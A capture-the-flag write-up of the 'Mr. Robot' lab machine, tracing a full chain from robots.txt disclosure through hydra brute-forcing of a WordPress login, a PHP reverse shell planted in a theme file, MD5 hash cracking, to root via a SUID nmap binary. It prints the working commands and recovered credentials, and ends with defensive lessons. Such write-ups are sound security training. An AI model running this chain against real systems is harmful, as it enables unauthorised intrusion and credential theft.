Mr. Robot: Root or Nothing

Intermediate 3 Keys Leona Kokerai 2024
Why I chose this room: Mr. Robot isn't just a CTF - it's a love letter to realistic attack chains. No abstract puzzles. The path from unauthenticated visitor to root mirrors real-world engagements: public info disclosure → credential brute-force → web shell → privilege escalation. I wanted to document not just what I did, but why each step follows from the last.

Phase 01

Reconnaissance - Know Before You Touch

My first instinct with any new target is always the same: resist the urge to immediately fire tools and instead build a mental model of what the application is. A web server is running - what does it serve, and what does it accidentally expose -

nmap is the starting gun for that question.

nmap_scan.sh
# Version detection (-sV), aggressive timing (-T4),
# all-format output (-oA), show only open ports
nmap <TARGET_IP> -sV -T4 -oA nmap-scan --open

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd
443/tcp open ssl/http Apache httpd
💡

I always save output with -oA - even when I think I won't need it. On a real engagement, that file becomes your evidence log. Good habits start in practice environments. The -T4 flag assumes a reliable network; on a flaky connection, -T3 prevents false negatives.

Two open ports, both serving HTTP/HTTPS. Standard web server setup. No SSH, no FTP - this machine wants me focused on the web surface. Let's oblige.

Phase 02

Directory Enumeration - Finding What Wasn't Meant to Be Found

The homepage is theatrical but informationally empty. Before poking at it manually, I want a map. gobuster lets me brute-force directory names against a wordlist - the equivalent of trying every door in a building.

gobuster
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

/.../wp-login (Status: 200)
/.../robots (Status: 200)

Two immediate hits. WordPress is a significant surface area - admin panels, plugin vulnerabilities, XML-RPC abuse. But before I get ahead of myself: /robots.txt.

⚠️

Robots.txt is not a security control. Developers use it to tell search crawlers what not to index. But listing a path there doesn't prevent access - it just asks nicely. Attackers read it like a treasure map.

http://<TARGET>/robots.txt
User-agent: *
Disallow: /fsocity.dic
Disallow: /key-1-of-3.txt
🗝️
Key 1 of 3 - Retrieved
Visit /key-1-of-3.txt directly - it's world-readable.

fsocity.dic downloads as a raw wordlist. At first glance it looks like noise - 858,160 entries. But the naming convention (fsociety, the hacker group from the show) suggests it's themed. These will be our credential candidates.

Phase 03

Credential Harvesting - Working Smarter Before Working Harder

Before launching any brute-force, I want to minimise wasted compute. 858,160 attempts against a web form is slow and noisy. First step: deduplicate.

bash
wc -w fsocity.dic
858160

# Deduplicate: write repeated entries, then append unique ones
sort fsocity.dic | uniq -d > fs-clean.txt
sort fsocity.dic | uniq -u >> fs-clean.txt

wc -w fs-clean.txt
11451
💡

This is a 98.6% reduction in attack surface before sending a single request. Working methodically before working loudly is what separates a tester from a script kiddie. Fewer requests also means less log noise on the target - relevant on real engagements.

Next, I need to understand how WordPress's login form communicates failures. I captured a failed login attempt with Burp Suite's Proxy. The POST body reveals the parameter names: log (username) and pwd (password). WordPress also helpfully differentiates error messages - "Invalid username" vs "The password you entered for the username" - which means I can enumerate usernames independently of passwords.

Step 1 - Find valid usernames:

hydra - username enumeration
hydra -L fs-clean.txt -p placeholder <TARGET_IP> \
http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" \
-t 30

# -L → username wordlist (capital = file)
# -p → static dummy password
# F= → failure string to filter out invalid attempts

[80][http-post-form] host: <TARGET_IP> login: elliot

Step 2 - Crack elliot's password:

hydra - password brute-force
hydra -l elliot -P fs-clean.txt <TARGET_IP> \
http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" \
-t 30

# -l → single username (lowercase = literal value)
# -P → password wordlist (capital = file)

[80][http-post-form] host: <TARGET_IP> login: elliot password: ER28-0652
💡

The two-stage approach - enumerate usernames first, then passwords - is far faster than a full credential matrix. It's also how real attackers operate: reduce unknowns one at a time. The case sensitivity in Hydra flags (-L vs -l, -P vs -p) is an easy mistake that silently breaks the attack.

Phase 04

Getting a Shell - WordPress as an Attack Vector

Elliot is an administrator. That's significant - WordPress admins can edit theme PHP files directly from the dashboard. This is a legitimate CMS feature being weaponised: I'm not exploiting a vulnerability, I'm abusing trusted functionality with stolen credentials.

  • Navigate to Appearance → Editor in the WordPress dashboard
  • Select the Archive template (archive.php) from the file list
  • Replace the entire content with Pentestmonkey's PHP reverse shell
  • Update the $ip variable to your attacking machine's IP
  • Set $port to any available port (I used 4444)
  • Save the file, then start a listener before visiting the page
catching the shell
# Start listener BEFORE triggering the page
nc -lnvp 4444

# Then visit: http://<TARGET>/wp-content/themes/twentyfifteen/archive.php

connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP]
Linux linux 3.13.0-55-generic #94-Ubuntu SMP
$ whoami
daemon
⚠️

Shell spawned as daemon - not the user I need. I'm in, but with minimal privileges. The next step is lateral movement to a named user account.

Phase 05

Lateral Movement - Cracking Robot's Hash

Poking around /home, the user robot has two files: the second key (owner-read only) and a file named password.raw-md5. The filename is practically a hint.

/home/robot/
ls -la /home/robot
-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5

cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

MD5 hashes are fast to compute, meaning they're fast to brute-force. This hash resolves in seconds on any hash database. I used hashcat with rockyou.txt, but CrackStation also works for known hashes:

hashcat
# -m 0 = MD5, -a 0 = dictionary attack
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
💡

The password is the alphabet in order. This is a perfect illustration of why password policies matter - a 26-character password that passes length checks but is entirely predictable. MD5 was never designed for password storage; any password stored as raw MD5 is effectively plaintext to an attacker with a GPU.

Switching to robot requires an interactive TTY. The daemon shell I caught doesn't qualify - I need to upgrade it first:

shell upgrade → su
# Spawn proper bash via Python's pty module
python -c 'import pty; pty.spawn("/bin/bash")'

su robot
Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
🗝️
Key 2 of 3 - Retrieved
Lateral movement complete. Now: root or nothing.
Phase 06

Privilege Escalation - SUID Abuse via nmap

The final key is in /root - I need to escalate. My first check is always SUID binaries: executables that run with the file owner's permissions (often root) regardless of who executes them. A misconfigured SUID on an interactive binary is a classic privesc.

SUID enumeration
# Search from / for files with SUID bit, suppress errors
find / -perm -u=s -type f 2>/dev/null

/bin/ping
/bin/umount
/bin/mount
/usr/local/bin/nmap
/usr/bin/sudo
...
⚠️

nmap with SUID is a critical misconfiguration. Older versions of nmap (2.02–5.21) include an --interactive flag that drops into a shell. Since nmap is owned by root with SUID set, that shell inherits root privileges. GTFOBins documents this exactly.

nmap interactive shell → root
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

# whoami
root

# cat /root/key-3-of-3.txt
🗝️
Key 3 of 3 - Retrieved
Root access achieved. Machine fully compromised.
Reflections

What This Room Taught Me

The Mr. Robot room is a masterclass in chaining. No single step here is catastrophic in isolation - the real damage is each vulnerability unlocking the next. Robots.txt disclosure leads to a credential wordlist. WordPress admin access enables code execution. A misconfigured SUID turns a low-privilege shell into root.

In a real-world context, any one of these issues would be a finding on a report. Together, they represent full system compromise from zero. This is why defence-in-depth matters: when you rely on a single control, you're one step away from an attacker who already bypassed it.

The two things I'll carry forward from this room: always deduplicate wordlists before brute-forcing (patience pays), and check GTFOBins for every unusual SUID binary - the community has done the research, and the results are humbling.
